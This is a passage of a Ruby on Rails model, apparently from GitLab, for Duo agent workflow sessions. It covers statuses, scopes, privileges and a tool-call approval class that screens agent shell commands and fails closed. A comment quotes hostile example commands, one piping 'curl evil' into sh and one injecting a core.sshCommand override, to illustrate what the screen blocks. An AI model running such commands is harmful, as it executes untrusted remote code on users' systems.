# frozen_string_literal: true

require 'shellwords'

module Ai
  module DuoWorkflows
    class Workflow < ::ApplicationRecord
      include AfterCommitQueue
      include Gitlab::SQL::Pattern
      include Gitlab::Utils::StrongMemoize
      include FromUnion
      include Sortable
      include Todoable
      include Presentable
      include Gitlab::Loggable

      # External agent sessions moved to ai_governance_sessions: https://gitlab.com/gitlab-org/gitlab/-/work_items/633899
      ignore_columns %i[sync_type jsonl_sha256 idempotency_key], remove_with: '19.7', remove_after: '2026-11-19'

      WORKLOAD_TAG = 'gitlab--duo'
      # Unique to the suspend-capable fleet. suspendable_workload_tag_for_dap is the only routing knob; there is
      # deliberately no user override, since the tag decides which runners receive DAP credentials.
      SUSPENDABLE_WORKLOAD_TAG = 'gitlab--duo--suspendable'
      TITLE_MAX_LENGTH = 40
      # GOAL_MAX_LENGTH bounds chars (~16k tokens); GOAL_MAX_BYTESIZE keeps DUO_WORKFLOW_GOAL,
      # the env var passing the goal to the executor, under Linux's 128 KiB per-variable cap
      # (MAX_ARG_STRLEN), which a char limit alone can't guarantee for multibyte UTF-8.
      # This is the ceiling: further growth must move out of this column.
      # See https://gitlab.com/gitlab-org/gitlab/-/work_items/616260
      GOAL_MAX_LENGTH = 65_536
      GOAL_MAX_BYTESIZE = 127.kilobytes
      IMAGE_MAX_LENGTH = 2048
      SUMMARY_MAX_LENGTH = 1_024
      MODEL_METADATA_JSON_MAX_LENGTH = 1_024
      FLOW_METADATA_JSON_MAX_LENGTH = 1_024
      SOURCE_LINK_MAX_LENGTH = 2_048
      SOURCE_CLIENT_MAX_LENGTH = ::Gitlab::Mcp::ClientInfo::MAX_LENGTH

      MAX_CONCURRENT_SESSIONS_PER_USER = 10

      # Set only by the server, never accepted from the REST `source` param.
      SERVER_SOURCE_TYPES = { slack: 1, mcp: 2, flow_trigger: 14, work_item_workplan: 17 }.freeze

      # Client-reported and unverified; the accepted values of the REST API `source` param.
      CLIENT_SOURCE_TYPES = {
        merge_request_code_conflict: 3,
        merge_request_dependency_bump: 4,
        merge_request_fix_pipeline: 5,
        merge_request_resolve_discussion: 6,
        work_item_to_merge_request: 7,
        fix_pipeline: 8,
        convert_platform_ci_pipeline: 9,
        duo_cli_interactive: 10,
        duo_cli_run: 11,
        duo_cli_acp: 12,
        ide_extension: 13,
        work_item_plan_to_merge_request: 15,
        web_chat: 16,
        vulnerability_leaked_token_rotation: 18,
        mobile_chat: 19
      }.freeze

      INTERACTIVE_CLI_SOURCE_TYPES = %w[duo_cli_interactive duo_cli_acp].freeze

      # Never remove a value or reuse an integer; both are persisted.
      SOURCE_TYPES = SERVER_SOURCE_TYPES.merge(CLIENT_SOURCE_TYPES).freeze

      # `status` label per state machine event. `retry` is excluded because it lands in
      # `running` and would be conflated with `started`. Note the awaiting-input statuses
      # scale with conversation turns, not sessions: chat cycles running <-> input_required
      # once per user message.
      COUNTED_TRANSITIONS = {
        start: 'started',
        finish: 'finished',
        stop: 'stopped',
        drop: 'dropped',
        resume: 'resumed',
        pause: 'paused',
        require_input: 'input_required',
        require_plan_approval: 'plan_approval_required',
        require_tool_call_approval: 'tool_call_approval_required',
        idle: 'idle'
      }.freeze

      # Events that move a session into or out of the `active` status group
      # (`created` + `running`). Only `enter_active` events (a session starting or
      # resuming onto a runner) can add load, so they are the ones that can breach
      # the per-actor concurrent-session limit.
      ACTIVE_DELTA_EVENTS = {
        start: :enter_active,
        resume: :enter_active,
        retry: :enter_active,
        pause: :exit_active,
        require_input: :exit_active,
        require_plan_approval: :exit_active,
        require_tool_call_approval: :exit_active,
        idle: :exit_active,
        finish: :exit_active,
        drop: :exit_active,
        stop: :exit_active
      }.freeze

      # `workflow_definition` is free-form user input on the create API, so it cannot be
      # used as a Prometheus label directly. Anything outside the known registries is
      # bucketed into OTHER_FLOW_TYPE to keep the series count bounded. Known values are
      # normalized to snake_case, so `developer/v1` is labelled `developer_v1`.
      OTHER_FLOW_TYPE = 'other'

      # Canonical workflow_definition strings for non-foundational-flow session types.
      # These must stay in sync with the services that set them:
      #   - Ai::ExternalAgents::Sessions::CreateService  uses EXTERNAL_AGENT_FLOW_TYPE
      #   - Ai::Catalog::ExecuteWorkflowService          uses AI_CATALOG_AGENT_FLOW_TYPE
      EXTERNAL_AGENT_FLOW_TYPE = 'external_agent'
      AI_CATALOG_AGENT_FLOW_TYPE = 'ai_catalog_agent'
      SOFTWARE_DEVELOPMENT_FLOW_TYPE = 'software_development'
      CLAUDE_CODE_COMPLIANCE_API_FLOW_TYPE = 'claude_code_compliance_api'

      BUILT_IN_FLOW_TYPES = [
        SOFTWARE_DEVELOPMENT_FLOW_TYPE,
        EXTERNAL_AGENT_FLOW_TYPE,
        AI_CATALOG_AGENT_FLOW_TYPE,
        CLAUDE_CODE_COMPLIANCE_API_FLOW_TYPE
      ].freeze

      CHAT_LOG_COUNTS = [Arel.sql('COUNT(*)'), Arel.sql('COUNT(DISTINCT version)')].freeze

      # Graph statuses of a checkpoint at rest between turns -- the settled point of a
      # turn, and the only safe place to resume a branch from.
      GRAPH_STATUSES_SETTLED = %w[input_required idle].freeze

      # One alternative attempt at a turn: the messages it produced and the
      # checkpoint a client resumes it from (see #workflow_branches).
      Branch = Struct.new(:fork_thread_ts, :messages, keyword_init: true)

      CyclicAncestryError = Class.new(StandardError)
      MissingAncestryError = Class.new(StandardError)
      OffCurrentBranchError = Class.new(StandardError)

      self.table_name = :duo_workflows_workflows

      belongs_to :user
      belongs_to :project, optional: true
      belongs_to :namespace, optional: true
      belongs_to :ai_catalog_item, optional: true, class_name: 'Ai::Catalog::Item'
      belongs_to :ai_catalog_item_version, optional: true, class_name: 'Ai::Catalog::ItemVersion'
      belongs_to :issue, optional: true
      belongs_to :work_item, optional: true, foreign_key: :issue_id, class_name: 'WorkItem', inverse_of: false
      belongs_to :merge_request, optional: true
      belongs_to :service_account, optional: true, class_name: 'User'
      belongs_to :trigger_flow_trigger, optional: true, class_name: 'Ai::FlowTrigger'
      belongs_to :trigger_flow_schedule, optional: true, class_name: 'Ai::FlowSchedule'
      belongs_to :parent_workflow, optional: true, class_name: 'Ai::DuoWorkflows::Workflow',
        inverse_of: :child_workflows

      has_many :checkpoints, class_name: 'Ai::DuoWorkflows::Checkpoint'
      has_many :checkpoint_writes, class_name: 'Ai::DuoWorkflows::CheckpointWrite'
      # Instance-scoped to the workflow's daily partition: the partition key is the
      # workflow's created_at (set on every row by CreateCheckpointService), so every
      # read prunes to one partition of p_duo_workflows_checkpoint_* instead of
      # scanning all of them. Mirrors CI partition-scoped associations (Ci::Build).
      has_many :checkpoint_blobs, ->(workflow) { where(workflow_created_at: workflow.created_at) },
        class_name: 'Ai::DuoWorkflows::CheckpointBlob', inverse_of: :workflow
      has_many :checkpoint_headers, ->(workflow) { where(workflow_created_at: workflow.created_at) },
        class_name: 'Ai::DuoWorkflows::CheckpointHeader', inverse_of: :workflow
      has_many :events, class_name: 'Ai::DuoWorkflows::Event'
      has_many :session_files, class_name: 'Ai::DuoWorkflows::SessionFile'
      has_many :workflows_workloads, class_name: 'Ai::DuoWorkflows::WorkflowsWorkload'
      has_many :workloads, through: :workflows_workloads, disable_joins: true
      has_many :work_item_links, class_name: 'Ai::DuoWorkflows::WorkflowWorkItem'
      has_many :linked_work_items, through: :work_item_links, source: :work_item, disable_joins: true
      has_many :merge_request_links, class_name: 'Ai::DuoWorkflows::WorkflowMergeRequest'
      has_many :linked_merge_requests, through: :merge_request_links, source: :merge_request, disable_joins: true
      has_many :note_links, class_name: 'Ai::DuoWorkflows::WorkflowNote'
      has_many :linked_notes, through: :note_links, source: :note, disable_joins: true
      has_many :created_note_links, -> { link_type_created }, class_name: 'Ai::DuoWorkflows::WorkflowNote',
        inverse_of: :workflow
      has_many :created_notes, through: :created_note_links, source: :note, disable_joins: true
      has_many :pipeline_links, class_name: 'Ai::DuoWorkflows::WorkflowPipeline'
      has_many :linked_pipelines, through: :pipeline_links, source: :pipeline, disable_joins: true
      has_many :workflow_links, class_name: 'Ai::DuoWorkflows::WorkflowWorkflow'
      has_many :linked_workflows, through: :workflow_links, source: :linked_workflow, disable_joins: true
      # Links where this session is the `linked_workflow`, for example the sessions restarted from it.
      has_many :inverse_workflow_links, class_name: 'Ai::DuoWorkflows::WorkflowWorkflow',
        foreign_key: :linked_workflow_id, inverse_of: :linked_workflow
      has_many :vulnerability_triggered_workflows, class_name: '::Vulnerabilities::TriggeredWorkflow'
      has_many :child_workflows, class_name: 'Ai::DuoWorkflows::Workflow', foreign_key: :parent_workflow_id,
        inverse_of: :parent_workflow
      has_many :code_review_findings, class_name: 'Ai::DuoWorkflows::CodeReview::Finding', inverse_of: :workflow

      attr_readonly :trigger_source
      attr_readonly :trigger_event_type
      attr_readonly :parent_workflow_id

      validates :status, presence: true
      validates :goal, length: { maximum: GOAL_MAX_LENGTH }, bytesize: { maximum: -> { GOAL_MAX_BYTESIZE } }
      validates :image, length: { maximum: IMAGE_MAX_LENGTH }, allow_blank: true
      validates :summary, length: { maximum: SUMMARY_MAX_LENGTH }, allow_blank: true
      validates :title, length: { maximum: TITLE_MAX_LENGTH }, allow_blank: true
      validates :model_metadata_json, length: { maximum: MODEL_METADATA_JSON_MAX_LENGTH }, allow_blank: true
      validates :flow_metadata_json, length: { maximum: FLOW_METADATA_JSON_MAX_LENGTH }, allow_blank: true
      validates :source_link, length: { maximum: SOURCE_LINK_MAX_LENGTH }, allow_blank: true
      validates :source_client_name, :source_client_version,
        length: { maximum: SOURCE_CLIENT_MAX_LENGTH }, allow_blank: true
      validates :parent_workflow, presence: true, on: :create, if: :triggered_by_flow?

      validate :only_known_agent_privileges
      validate :only_known_pre_approved_agent_privileges
      validate :pre_approved_privileges_included_in_agent_privileges, on: :create
      validate :valid_service_account_user
      validate :item_matches_version

      before_create :set_title_from_workflow_definition, if: -> { title.blank? }

      # `created` is the initial state, so it has no transition to hook into.
      after_commit :increment_created_sessions_counter, on: :create

      validates :tool_call_approvals,
        json_schema: { filename: 'duo_tool_call_approvals', size_limit: 64.kilobytes }

      validates :messaging_callback_context,
        json_schema: { filename: 'duo_messaging_callback_context', size_limit: 16.kilobytes },
        allow_nil: true

      # `ide` is deprecated in favor of `chat`
      # `web` is deprecated in favor of `ambient`
      enum :environment, { ide: 1, web: 2, chat_partial: 3, chat: 4, ambient: 5, external: 6 }
      enum :trigger_source, { human: 0, system: 1, scheduled: 2, verification: 3, flow: 4 }, prefix: :triggered_by
      # Derived by FlowExecutionAuthorizer, unlike `environment`, which the client asserts.
      # Nil when nothing classified the run; see #execution_unclassified?.
      enum :execution_mode, { client: 1, background: 2 }, prefix: :executed_by

      enum :source_type, SOURCE_TYPES, prefix: :source

      enum :trigger_event_type, ::Ai::FlowTrigger::EVENT_TYPES, prefix: :trigger_event

      # The status API runs under the session owner's token and cannot tell the
      # service from the owner's client, so only reasons a service would name are
      # accepted. Rails-derived reasons stay unforgeable; a listed value is self-reported.
      SERVICE_DROP_REASONS = %w[
        token_rejected
        tool_rules_unavailable
      ].freeze

      # Why the session was force-failed, distinct from the free-text `summary`
      # (which GenerateWorkflowSummaryWorker overwrites). Nil = not force-failed.
      # Stored as the string itself rather than an enum-backed integer so the
      # reason is self-describing downstream (ClickHouse, analytics) and a new
      # path can record one without a schema change. This frozen list keeps the
      # vocabulary agreed so the values stay groupable.
      DROP_REASONS = (%w[
        job_failed
        no_status_reported
        no_activity
        workload_not_created
        api_reported
        preconditions_not_met
        compute_minutes_used_up
        could_not_prepare_session
        start_failed
      ] + SERVICE_DROP_REASONS).freeze

      # A nil cause is deliberate: a vague cause is left out. Nothing maps to `stopped_part_way` until the
      # service names those failures.
      FAILURE_MAPPING = {
        'no_activity' => { category: 'transient', cause: :failure_cause_no_activity },
        'job_failed' => { category: 'unknown', cause: :failure_cause_job_failed },
        'preconditions_not_met' => { category: 'user_fixable', cause: :failure_cause_preconditions_not_met },
        'compute_minutes_used_up' => { category: 'user_fixable', cause: :failure_cause_compute_minutes_used_up },
        'could_not_prepare_session' => { category: 'transient', cause: :failure_cause_could_not_prepare_session },
        'api_reported' => { category: 'unknown', cause: nil },
        'no_status_reported' => { category: 'unknown', cause: :failure_cause_no_status_reported },
        'start_failed' => { category: 'unknown', cause: :failure_cause_start_failed },
        'workload_not_created' => { category: 'user_fixable', cause: :failure_cause_workload_not_created },
        'token_rejected' => { category: 'user_fixable', cause: :failure_cause_token_rejected },
        'tool_rules_unavailable' => { category: 'transient', cause: nil }
      }.freeze

      validates :drop_reason, inclusion: { in: DROP_REASONS }, allow_nil: true

      scope :for_user_with_id!, ->(user_id, id) { find_by!(user_id: user_id, id: id) }
      scope :for_user, ->(user_id) { where(user_id: user_id) }
      scope :without_other_users_private_sessions, ->(user_id) {
        where(
          "(messaging_callback_context ->> 'adapter') IS NULL OR " \
            "(messaging_callback_context ->> 'adapter') NOT IN (?) OR user_id = ?",
          ::Ai::Messaging::AdapterRegistry.private_to_invoker_keys, user_id
        )
      }
      # A Duo conversation (@GitLabDuo mention) shares the code_review/v1 definition and
      # merge_request_id with an automated review, so definition alone cannot tell them
      # apart. Only conversations carry a messaging adapter.
      scope :without_messaging_sessions, -> { where("(messaging_callback_context ->> 'adapter') IS NULL") }
      scope :without_client_executed, -> { where(execution_mode: [nil, :background]) }
      scope :for_project, ->(project) { where(project: project) }
      scope :for_project_and_work_item_iid, ->(project_id, iid) {
        # `(project_id, iid)` is unique. Without the limit, low IIDs in large projects are misestimated
        # and the planner scans the whole link table.
        work_item_ids = ::WorkItem.where(project_id: project_id, iid: iid).limit(1).select(:id)

        linked_workflow_ids = ::Ai::DuoWorkflows::WorkflowWorkItem
          .where(work_item_id: work_item_ids).select(:workflow_id)

        # Sessions from before the link table (19.2), or whose best-effort link failed, only set the column.
        column_workflow_ids = unscoped.where(issue_id: work_item_ids).select(:id)

        # A UNION, not OR, so each lookup uses its own index instead of filtering every user workflow.
        # UNION ALL is enough because `IN` ignores duplicates.
        union_sql = ::Gitlab::SQL::Union.new([column_workflow_ids, linked_workflow_ids], remove_duplicates: false)
          .to_sql
        where(project_id: project_id).where("#{quoted_table_name}.id IN (#{union_sql})")
      }
      scope :external, -> { where(environment: :external) }
      scope :ordered_by_id_desc, -> { order(id: :desc) }
      scope :order_by_with_id_tie_breaker, ->(sort, direction) { order_by(sort).order(id: direction) }
      scope :for_status, ->(status) do
        value = state_machines[:status].states[status.to_sym]&.value
        value ? where(status: value) : none
      end
      scope :for_merge_request, ->(merge_request) { where(merge_request_id: merge_request) }
      scope :for_project_and_merge_request_iid, ->(project_id, iid) {
        # `(target_project_id, iid)` is unique. Without the limit, low IIDs in large projects are misestimated
        # and the planner scans the whole link table.
        merge_request_ids = ::MergeRequest.where(target_project_id: project_id, iid: iid).limit(1).select(:id)

        linked_workflow_ids = ::Ai::DuoWorkflows::WorkflowMergeRequest
          .where(merge_request_id: merge_request_ids).select(:workflow_id)

        # Sessions from before the link table (19.2), or whose best-effort link failed, only set the column.
        column_workflow_ids = unscoped.where(merge_request_id: merge_request_ids).select(:id)

        # A UNION, not OR, so each lookup uses its own index instead of filtering every user workflow.
        # UNION ALL is enough because `IN` ignores duplicates.
        union_sql = ::Gitlab::SQL::Union.new([column_workflow_ids, linked_workflow_ids], remove_duplicates: false)
          .to_sql
        where(project_id: project_id).where("#{quoted_table_name}.id IN (#{union_sql})")
      }
      scope :with_created_merge_request, ->(merge_request) {
        where(id: WorkflowMergeRequest.created_for_merge_request(merge_request).select(:workflow_id))
      }
      scope :for_issue, ->(issue) { where(issue_id: issue) }
      # Most recent run per issue, carrying only the columns #progress_status and
      # WorkItems::Widgets::AgentPlan#readiness_score_status read:
      # an issue can be re-run any number of times, so without DISTINCT ON a read
      # across a page of issues hands back an unbounded number of rows. DISTINCT ON
      # requires the ORDER BY to lead with issue_id, so both halves stay here rather
      # than at the call site.
      scope :latest_per_issue, -> do
        select("DISTINCT ON (#{table_name}.issue_id) #{table_name}.id, #{table_name}.issue_id, " \
          "#{table_name}.status, #{table_name}.created_at")
          .order(:issue_id, id: :desc)
      end
      scope :for_flow_triggers, ->(flow_triggers) do
        pairs = flow_trigger_pairs(flow_triggers)
        next none if pairs.empty?

        where([:trigger_flow_trigger_id, :service_account_id] => pairs)
      end
      scope :in_namespace, ->(namespace) {
        namespace_ids = namespace.self_and_descendants.select(:id)
        project_ids = ::Project.in_namespace(namespace_ids).select(:id)
        where(project_id: project_ids).or(where(namespace_id: namespace.id))
      }
      scope :in_namespace_hierarchy, ->(namespace) {
        namespace_ids = namespace.self_and_descendants.select(:id)
        project_ids = ::Project.in_namespace(namespace_ids).select(:id)

        # UNION ALL instead of OR: the check constraint guarantees exactly one
        # of project_id/namespace_id is set, so the arms are disjoint, and the
        # planner can drive each arm from its own index instead of scanning the
        # whole created_at range instance-wide.
        from_union([where(project_id: project_ids), where(namespace_id: namespace_ids)], remove_duplicates: false)
      }
      scope :stale_since, ->(time) { where(updated_at: ...time).order(updated_at: :asc, id: :asc) }
      scope :with_workflow_definition, ->(definition) { where(workflow_definition: definition) }
      scope :without_workflow_definition, ->(definition) { where.not(workflow_definition: definition) }
      scope :without_foundational_chat_agents, -> do
        without_workflow_definition(::Ai::FoundationalChatAgent.workflow_definitions)
      end
      # NULL source_type means the session predates the client sending `source`; keep those rows.
      scope :without_source_types, ->(types) { where(source_type: nil).or(where.not(source_type: types)) }
      # Headless CLI runs can have a goal while still in the created state.
      # When without_source_types(INTERACTIVE_CLI_SOURCE_TYPES) is already applied, Rails
      # omits the redundant status != 0 branch (0 means created) and repeats the source predicate.
      scope :without_empty_cli_sessions, -> {
        without_source_types(INTERACTIVE_CLI_SOURCE_TYPES).or(without_status(:created))
      }
      scope :with_environment, ->(environment) { where(environment: environment) }
      scope :created_between, ->(from, to) { where(created_at: from...to) }
      scope :for_agent_identities, ->(identities) { where(agent_identity_id: identities.select(:id)) }
      scope :for_agent_class, ->(agent_class) do
        case agent_class
        when :internal_dap then where(agent_type: nil)
        when :external then where.not(agent_type: nil)
        else all
        end
      end
      scope :created_after, ->(time) { where('created_at > ?', time) }
      # The id bound lets indexes that end in `id` skip sessions created before `time`.
      scope :created_after_in_project, ->(project, time) do
        first_id = unscoped.for_project(project).created_after(time).order(:created_at, :id).select(:id).limit(1)

        created_after(time).where(arel_table[:id].gteq(first_id.arel))
      end
      scope :created_before, ->(time) { where(created_at: ...time) }
      scope :from_pipeline, -> do
        without_foundational_chat_agents
          .with_environment(ENVIRONMENTS_FROM_PIPELINE)
      end
      scope :in_status_group, ->(status_group) do
        statuses_in_group = GROUPED_STATUSES.fetch(status_group.to_sym, [])

        if statuses_in_group.empty?
          none
        else
          state_machine_states = state_machines[:status].states
          status_db_values = statuses_in_group.map { |status| state_machine_states[status.to_sym].value }
          where(status: status_db_values)
        end
      end
      scope :in_statuses, ->(status_db_values) { where(status: status_db_values) }
      scope :with_non_terminal_status, -> { without_statuses(TERMINAL_STATUSES) }
      scope :order_by_status, ->(direction) do
        status_order_expression = Arel::Nodes::NamedFunction.new(
          'ARRAY_POSITION',
          [
            Arel.sql("ARRAY#{ordered_statuses}::smallint[]"),
            arel_table[:status]
          ]
        )

        final_order_expression =
          if direction.to_s.casecmp?('desc')
            status_order_expression.desc
          else
            status_order_expression.asc
          end

        order = Gitlab::Pagination::Keyset::Order.build([
          Gitlab::Pagination::Keyset::ColumnOrderDefinition.new(
            attribute_name: 'status',
            column_expression: status_order_expression,
            order_expression: final_order_expression,
            order_direction: direction,
            nullable: :not_nullable
          ),
          # Tie-breaker for deterministic ordering
          Gitlab::Pagination::Keyset::ColumnOrderDefinition.new(
            attribute_name: 'id',
            order_expression: arel_table[:id].desc,
            nullable: :not_nullable
          )
        ])

        reorder(order)
      end
      scope :updated_after, ->(time) { where(updated_at: time..) }
      scope :with_preloaded_associations, -> {
        preload(:project, :user, :namespace, ai_catalog_item_version: :item)
      }
      scope :with_project_routes, -> { preload(project: [:route, { namespace: :route }]) }

      TARGET_STATUSES = {
        start: :running,
        pause: :paused,
        require_input: :input_required,
        require_plan_approval: :plan_approval_required,
        require_tool_call_approval: :tool_call_approval_required,
        resume: :running,
        retry: :running,
        finish: :finished,
        drop: :failed,
        stop: :stopped,
        idle: :idle
      }.freeze

      GROUPED_STATUSES = {
        active: [:created, :running],
        paused: [:paused],
        awaiting_input: [:input_required, :plan_approval_required, :tool_call_approval_required],
        completed: [:finished, :idle],
        failed: [:failed],
        canceled: [:stopped]
      }.freeze

      TERMINAL_STATUSES = %i[finished failed stopped].freeze

      # Parked on a human decision. Unlike :input_required, which ends a turn with
      # an answer, these end it with a question: there is nothing to deliver until
      # the surface answers and the run resumes.
      APPROVAL_STATUSES = %i[plan_approval_required tool_call_approval_required].freeze

      AUTONOMOUS_TRIGGER_SOURCES = %w[system scheduled].freeze

      ENVIRONMENTS_FROM_PIPELINE = %w[web ambient].freeze
      ENVIRONMENTS_DEPRECATIONS = {
        'ide' => 'chat',
        'web' => 'ambient'
      }.freeze

      # Collapses environments renamed in 18.6 onto their replacement, so one person on
      # one product is one agent instance regardless of which spelling the caller used.
      # ENVIRONMENTS_DEPRECATIONS records these as `renamed`, so the pair is one concept
      # by definition, and both spellings have live writers: `web` from
      # Ai::Catalog::ExecuteWorkflowService and Ai::FlowTriggers::RunService, `ambient`
      # from the Duo Workflow Service `start_flow` tool. Built from the constants so the
      # mapping cannot drift from the enum.
      NORMALIZED_ENVIRONMENT =
        begin
          whens = ENVIRONMENTS_DEPRECATIONS.map do |from, to|
            "WHEN #{environments.fetch(from)} THEN #{environments.fetch(to)}"
          end

          "CASE environment #{whens.join(' ')} ELSE environment END".freeze
        end

      # Identifies one active agent instance for the governance metrics.
      #
      # Internal DAP sessions are keyed on (user, container, normalized environment),
      # where environment is the product (chat, ambient, chat_partial). The container is
      # both project_id and namespace_id, because `num_nonnulls(namespace_id,
      # project_id) = 1` means namespace-attached sessions carry a NULL project_id and
      # would otherwise collapse across every namespace in the hierarchy. External
      # sessions are keyed on (user, project, agent_type, agent_identity_id): an
      # external agent runs under whatever environment its session carries, and an
      # agent identity is one machine running one agent product for one user in one
      # project, so including it separates the same product run from two machines.
      # Sessions with no identity fall back to per-product, which is also what happens
      # if an identity is later deleted (the FK nullifies).
      #
      # `agent_type IS NULL` tells the two classes apart, so one expression restricts
      # correctly for either and the key spaces stay disjoint: ALL is exactly
      # INTERNAL_DAP + EXTERNAL.
      #
      # AGENT_INSTANCE_KEY_COLUMNS is shared with
      # Ai::Governance::ClickHouseMetricsService's mirror of this key, so the two
      # backends cannot drift on the identity columns; only the dialect-specific
      # normalized-environment term is written per side.
      AGENT_INSTANCE_KEY_COLUMNS =
        %w[user_id project_id namespace_id agent_type agent_identity_id].freeze

      AGENT_INSTANCE_KEY =
        "(#{AGENT_INSTANCE_KEY_COLUMNS.join(', ')}, " \
          "CASE WHEN agent_type IS NULL THEN #{NORMALIZED_ENVIRONMENT} END)".freeze

      class AgentPrivileges
        READ_WRITE_FILES  = 1
        READ_ONLY_GITLAB  = 2
        READ_WRITE_GITLAB = 3
        RUN_COMMANDS      = 4
        USE_GIT           = 5
        RUN_MCP_TOOLS     = 6
        START_FLOWS       = 7
        READ_ONLY_FILES   = 8

        ALL_PRIVILEGES = {
          READ_WRITE_FILES => {
            name: "read_write_files",
            description: "Allow local filesystem read/write access"
          }.freeze,
          READ_ONLY_GITLAB => {
            name: "read_only_gitlab",
            description: "Allow read only access to GitLab APIs"
          }.freeze,
          READ_WRITE_GITLAB => {
            name: "read_write_gitlab",
            description: "Allow write access to GitLab APIs"
          }.freeze,
          RUN_COMMANDS => {
            name: "run_commands",
            description: "Allow running any commands"
          }.freeze,
          USE_GIT => {
            name: "use_git",
            description: "Allow git commits, push and other git commands"
          }.freeze,
          RUN_MCP_TOOLS => {
            name: "run_mcp_tools",
            description: "Allow running MCP tools"
          }.freeze,
          START_FLOWS => {
            name: "start_flows",
            description: "Allow starting foundational flows from chat"
          }.freeze,
          READ_ONLY_FILES => {
            name: "read_only_files",
            description: "Allow local filesystem read access"
          }.freeze
        }.freeze

        DEFAULT_PRIVILEGES = [
          READ_WRITE_FILES,
          READ_ONLY_GITLAB,
          READ_WRITE_GITLAB,
          RUN_COMMANDS,
          USE_GIT,
          RUN_MCP_TOOLS
        ].freeze
      end

      # Value object for managing tool call approvals stored in JSONB
      class ToolCallApprovals
        CALL_ARGS_KEY = 'call_args'
        PATTERNS_KEY = 'patterns'
        COMMAND_TOOL_NAME = 'run_command'
        GIT_COMMAND_TOOL_NAME = 'run_git_command'
        COMMAND_TOOL_NAMES = [COMMAND_TOOL_NAME, GIT_COMMAND_TOOL_NAME].freeze
        MAX_PATTERNS_PER_TOOL = 100
        MAX_PATTERN_LENGTH = 256
        SHELL_METACHARACTERS = /[;&|<>$`(){}]/
        MATCH_TYPE_EXACT_HASH = 'exact_hash'
        MATCH_TYPE_PATTERN = 'pattern'
        CANONICAL_CALL_ARGS_MAX_BYTES = 64.kilobytes

        ApprovalMatch = Struct.new(:matched, :match_type, :matched_pattern, keyword_init: true)

        NO_APPROVAL_MATCH = ApprovalMatch.new(matched: false).freeze

        def initialize(data = {})
          @approvals = data.dup
        end

        def add_approval(tool_name:, call_args:)
          call_args_hash = hash_call_args(call_args)
          @approvals[tool_name] ||= { CALL_ARGS_KEY => [] }

          # Handle both Set (in-memory) and Array (from JSONB) cases
          call_args_set = Set.new(@approvals[tool_name][CALL_ARGS_KEY])
          call_args_set.add(call_args_hash)
          @approvals[tool_name][CALL_ARGS_KEY] = call_args_set.to_a
        end

        def add_pattern_approval(tool_name:, pattern:)
          validate_pattern!(pattern)
          validate_command_tool_pattern!(tool_name, pattern)

          @approvals[tool_name] ||= { CALL_ARGS_KEY => [] }
          @approvals[tool_name][PATTERNS_KEY] ||= []

          patterns_set = Set.new(@approvals[tool_name][PATTERNS_KEY])
          patterns_set.add(pattern)

          if patterns_set.size > MAX_PATTERNS_PER_TOOL
            raise ArgumentError, "Maximum of #{MAX_PATTERNS_PER_TOOL} patterns per tool"
          end

          @approvals[tool_name][PATTERNS_KEY] = patterns_set.to_a
        end

        def approved?(tool_name:, call_args:)
          approval_match(tool_name: tool_name, call_args: call_args).matched
        end

        # Like approved?, but retains which mechanism/pattern matched, for audit purposes.
        def approval_match(tool_name:, call_args:)
          tool_approvals = @approvals[tool_name]
          return NO_APPROVAL_MATCH unless tool_approvals

          # Exact match always works -- this is the user's deliberate choice
          if exact_hash_match?(tool_approvals, call_args)
            return ApprovalMatch.new(matched: true, match_type: MATCH_TYPE_EXACT_HASH)
          end

          match_target = extract_match_target(tool_name, call_args)

          is_command_tool = COMMAND_TOOL_NAMES.include?(tool_name)

          # For command tools, validate the command is safe for pattern-based
          # approval. This combines two checks in a single tokenization pass:
          # 1. Reject shell metacharacters (prevents "git checkout main; curl evil | sh")
          # 2. Validate program-specific structure (prevents "git -c core.sshCommand=evil fetch")
          return NO_APPROVAL_MATCH if is_command_tool && !command_safe_for_pattern_approval?(match_target)

          matched_pattern = tool_approvals[PATTERNS_KEY]&.find do |pattern|
            if is_command_tool
              CommandPatternMatcher.match?(pattern, match_target)
            else
              File.fnmatch(pattern, match_target, File::FNM_DOTMATCH)
            end
          end

          return NO_APPROVAL_MATCH unless matched_pattern

          ApprovalMatch.new(matched: true, match_type: MATCH_TYPE_PATTERN, matched_pattern: matched_pattern)
        end

        def to_h
          @approvals
        end

        def [](key)
          @approvals[key]
        end

        def []=(key, value)
          @approvals[key] = value
        end

        def each
          @approvals.each { |tool_name, approval| yield tool_name, approval }
        end

        def empty?
          @approvals.empty?
        end

        def keys
          @approvals.keys
        end

        private

        # Checks whether the string contains shell metacharacters.
        # Used by both pattern validation (add_pattern_approval) and
        # the unified approval check (command_safe_for_pattern_approval?).
        def command_contains_shell_metacharacters?(match_target)
          return true if match_target.match?(/[\n\r]/)

          tokens = Shellwords.split(match_target)
          tokens.any? { |token| token.match?(SHELL_METACHARACTERS) }
        rescue ArgumentError
          # Unbalanced quotes - reject
          true
        end

        # Validates a command is safe for pattern-based approval.
        # Checks metacharacters first, then delegates to the program-specific
        # validator. Unregistered programs fail closed (exact-match only).
        def command_safe_for_pattern_approval?(match_target)
          return false if command_contains_shell_metacharacters?(match_target)

          tokens = Shellwords.split(match_target)
          return true if tokens.empty?

          program = tokens.first
          return false unless CommandValidators::Registry.registered?(program)

          validator = CommandValidators::Registry.validator_for(program)
          validator.safe_for_pattern_matching?(program: program, tokens: tokens[1..])
        rescue ArgumentError
          # Unbalanced quotes - reject (fail closed)
          false
        end

        # Extracts the string that patterns are matched against.
        # For command tools (run_command, run_git_command), returns the command
        # string so that users can write intuitive patterns like 'git checkout *'.
        # For all other tools, returns the raw call_args string.
        def extract_match_target(tool_name, call_args)
          return call_args unless tool_name == COMMAND_TOOL_NAME || tool_name == GIT_COMMAND_TOOL_NAME

          parsed = begin
            Gitlab::Json.safe_parse(call_args)
          rescue JSON::ParserError, EncodingError
            nil
          end
          return call_args unless parsed.is_a?(Hash)

          if tool_name == GIT_COMMAND_TOOL_NAME
            command = parsed['command'].to_s
            args = parsed['args']
            # join(' ') flattens array elements; args with embedded spaces merge
            # into the token stream. Not a security issue (metacharacter check
            # still applies) but patterns may not match as the user expects.
            args_str = args.is_a?(Array) ? args.join(' ') : args.to_s
            parts = ["git", command]
            parts << args_str if args_str.present?
            parts.join(' ')
          elsif parsed.key?('command')
            parsed['command'].to_s
          elsif parsed.key?('program')
            program = parsed['program'].to_s
            args = parsed['args']
            args_str = args.is_a?(Array) ? args.join(' ') : args.to_s
            args_str.present? ? "#{program} #{args_str}" : program
          else
            call_args
          end
        end

        def validate_pattern!(pattern)
